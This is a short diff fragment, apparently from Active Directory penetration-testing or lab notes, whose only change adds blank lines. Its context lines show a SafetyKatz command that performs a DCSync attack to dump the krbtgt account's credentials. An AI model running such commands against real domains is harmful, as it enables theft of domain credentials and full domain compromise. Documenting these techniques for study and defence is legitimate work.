@@ -576,3 +576,6 @@ or
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
+
+
+
